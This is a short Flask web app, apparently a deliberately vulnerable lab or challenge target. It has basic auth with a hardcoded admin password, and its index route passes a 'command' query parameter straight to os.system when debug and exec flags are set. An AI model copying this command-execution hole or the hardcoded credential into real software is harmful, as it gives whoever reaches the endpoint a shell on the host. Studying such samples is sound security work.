from flask import Flask, request, abort, make_response
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
import os

app = Flask(__name__)
auth = HTTPBasicAuth()

users = {
    "admin": generate_password_hash("whitewalkers")
}

@auth.verify_password
def verify_password(username, password):
    if username in users:
        return check_password_hash(users.get(username), password)
    return False

@app.route('/')
@auth.login_required
def index():
    if request.args.get("debug") == "True" and request.args.get("action") == "exec":
    	command = request.args.get("command")
    	os.system(command)
    	return make_response("Executed!", 200)
    else:
    	abort(404)
#
# Localhost port 5000
#
if __name__ == '__main__':
    app.run()